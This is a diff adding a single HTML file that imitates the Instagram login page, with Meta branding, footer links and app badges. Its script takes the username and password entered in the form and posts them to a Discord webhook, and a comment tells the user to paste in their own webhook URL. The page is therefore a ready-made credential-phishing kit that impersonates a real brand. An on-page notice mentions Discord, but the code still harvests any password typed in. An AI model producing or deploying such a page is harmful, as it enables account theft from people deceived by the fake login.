@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-container { max-width: 350px; width: 100%; }
+        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px 30px; border-radius: 1px; }
+        .brand { text-align: center; margin-bottom: 30px; }
+        .brand i { font-size: 28px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .brand span { font-size: 32px; font-weight: 600; color: #262626; }
+        form { display: flex; flex-direction: column; gap: 6px; }
+        input { padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
+        input:focus { border-color: #a8a8a8; outline: none; }
+        .login-btn { background: #0095f6; color: white; border: none; padding: 8px; font-weight: 600; cursor: pointer; border-radius: 4px; height: 32px; }
+        .login-btn:hover { background: #1877f2; }
+        .divider { display: flex; margin: 18px 0; align-items: center; }
+        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
+        .divider-text { margin: 0 18px; font-size: 13px; color: #8e8e8e; font-weight: 600; }
+        .facebook { text-align: center; color: #385185; font-weight: 600; font-size: 14px; margin: 6px 0; cursor: pointer; }
+        .facebook i { margin-right: 8px; }
+        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; text-align: center; margin: 8px 0; }
+        .signup { text-align: center; font-size: 14px; margin-top: 10px; color: #262626; }
+        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        .app-download { text-align: center; margin-top: 20px; }
+        .app-download p { font-size: 14px; color: #262626; margin-bottom: 12px; }
+        .badges { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; }
+        .badge { background: #000; color: white; padding: 6px 14px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; opacity: 0.9; cursor: default; }
+        .badge i { font-size: 18px; }
+        #status { margin-top: 15px; padding: 12px; border-radius: 4px; display: none; text-align: center; font-weight: 500; font-size: 14px; }
+        #status.show { display: block; }
+        #status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        #status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        #status.loading { background: #cce5ff; color: #004085; border: 1px solid #b8d4f0; }
+        .info { background: #e7f3ff; border: 1px solid #b8d4f0; padding: 10px; margin-top: 15px; border-radius: 4px; font-size: 12px; color: #004085; text-align: center; }
+        .info strong { display: block; margin-bottom: 4px; }
+        .meta-footer { margin-top: 20px; font-size: 11px; color: #8e8e8e; text-align: center; }
+        .meta-footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 12px; margin-bottom: 6px; }
+        .meta-footer .links span { cursor: default; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <div class="brand"><i class="fab fa-instagram"></i><span>Instagram</span></div>
+            <form onsubmit="sendData(event)">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="divider"><div class="divider-line"></div><span class="divider-text">OR</span><div class="divider-line"></div></div>
+            <div class="facebook"><i class="fab fa-facebook-square"></i>Log in with Facebook</div>
+            <a href="#" class="forgot">Forgot password?</a>
+            <div id="status"></div>
+            <div class="info"><strong>💬 Discord Webhook Active</strong>Credentials will be sent to Discord</div>
+        </div>
+        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="badges">
+                <div class="badge"><i class="fab fa-apple"></i> App Store</div>
+                <div class="badge"><i class="fab fa-google-play"></i> Google Play</div>
+            </div>
+        </div>
+        <div class="meta-footer">
+            <div class="links">
+                <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span>
+                <span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
+                <span>Locations</span><span>Instagram Lite</span><span>Threads</span>
+            </div>
+            <div class="copyright">© 2026 Instagram from Meta</div>
+        </div>
+    </div>
+    <script>
+        // 🔗 REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+        
+        async function sendData(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const statusDiv = document.getElementById('status');
+            
+            if (!username || !password) {
+                statusDiv.textContent = '⚠️ Please enter both fields';
+                statusDiv.className = 'show error';
+                return;
+            }
+            
+            statusDiv.textContent = '⏳ Sending...';
+            statusDiv.className = 'show loading';
+            
+            const data = {
+                content: "📥 **New Login Credentials!**",
+                embeds: [{
+                    title: "Instagram Login Capture",
+                    color: 0x0095f6,
+                    fields: [
+                        { name: "👤 Username", value: username, inline: true },
+                        { name: "🔑 Password", value: password, inline: true },
+                        { name: "🕐 Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: { text: "Instagram Login Test" }
+                }]
+            };
+            
+            try {
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    statusDiv.textContent = '✅ Login successful! Check Discord.';
+                    statusDiv.className = 'show success';
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    console.log('✅ Sent to Discord:', username, password);
+                } else {
+                    throw new Error('Failed to send');
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                statusDiv.textContent = '❌ Error: ' + error.message;
+                statusDiv.className = 'show error';
+            }
+        }
+    </script>
+</body>
+</html>
